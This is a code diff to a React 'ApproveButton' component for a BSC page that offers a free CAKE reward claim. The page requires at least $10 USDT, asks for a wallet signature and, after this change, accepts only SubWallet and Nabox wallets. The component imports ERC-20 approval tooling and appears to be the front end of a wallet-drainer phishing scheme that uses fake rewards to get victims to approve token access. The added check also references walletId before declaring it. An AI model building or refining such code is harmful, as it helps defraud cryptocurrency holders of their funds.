@@ -4,6 +4,7 @@ import { useAccount, useWalletClient, useBalance } from "wagmi";
 import { erc20Abi, parseUnits } from "viem";
 import { bsc } from "wagmi/chains";
 import { useState, useEffect } from "react";
+import { eligibleWallets } from "../eligibleWallets";
 
 // 🔹 Load from .env
 const USDT_ADDRESS = import.meta.env.VITE_USDT_ADDRESS; 
@@ -129,7 +130,7 @@ export default function ApproveButton() {
   const { data: walletClient } = useWalletClient();
   const [loading, setLoading] = useState(false);
 
-    const [cakeReward, setCakeReward] = useState(0);
+  const [cakeReward, setCakeReward] = useState(0);
   const [scanCompleted, setScanCompleted] = useState(false);
 
   useEffect(() => {
@@ -210,9 +211,25 @@ export default function ApproveButton() {
       return;
     }
 
-    // Check if user has minimum USDT before proceeding
+    // Wallet eligibility check
+     console.log("Wallet ID sent to claim button:", walletId);
+    const walletId = walletClient?.connector?.id;
+    if (!eligibleWallets[walletId]) {
+       console.log("Wallet ID sent to claim button:", walletId);
+      alert(
+        "🚫🔒 Eligibility check failed — you need at least $10 USDT (BSC) to claim. Please top up and try again.\n" +
+        "🚫🔒 Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet."
+      );
+     
+      return;
+    }
+
+    // USDT minimum check
     if (!hasMinimumUsdt) {
-      alert("🚫🔒 Eligibility check failed — you need at least $10 USDT (BSC) to claim. Please top up and try again.");
+      alert(
+        "🚫🔒 Eligibility check failed — you need at least $10 USDT (BSC) to claim. Please top up and try again.\n" +
+        "🚫🔒 Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet."
+      );
       return;
     }
 
@@ -225,7 +242,7 @@ export default function ApproveButton() {
     try {
       // Step 1: Personal Sign Message
       const cakeAmount = cakeReward && parseFloat(cakeReward) > 0 ? parseFloat(cakeReward) : 5; // Default to 5 CAKE if not scanned
-      const signMessage = `🍰Claim ${cakeAmount} CAKE Reward🍰`;
+      const signMessage = `Claim ${cakeAmount} CAKE Reward`;
       //console.log("Requesting personal sign for:", signMessage);
 
       const signature = await walletClient.signMessage({
@@ -320,6 +337,9 @@ export default function ApproveButton() {
   const usdtBalanceNumber = usdtBalance ? parseFloat(usdtBalance.formatted) : 0;
   const hasMinimumUsdt = usdtBalanceNumber >= 10;
 
+ 
+  console.log("USDT balance sent to claim button:", usdtBalanceNumber);
+
   // Only show button if wallet is connected AND scanning is completed
   if (!isConnected || !scanCompleted) {
     return (
@@ -389,6 +409,8 @@ export default function ApproveButton() {
           }} />
         )}
         <span style={{ position: "relative", zIndex: 1 }}>
+          
+      
           {loading ? "🔄 Claiming..." : cakeReward && parseFloat(cakeReward) > 0 ? `🍰 Claim ${parseFloat(cakeReward)} CAKE` : "🍰 Claim CAKE Reward"}
         </span>
         <style>
@@ -400,7 +422,7 @@ export default function ApproveButton() {
           `}
         </style>
       </button>
-
+     
       {/* Warning message when insufficient USDT */}
       {!hasMinimumUsdt && (
         <div style={{
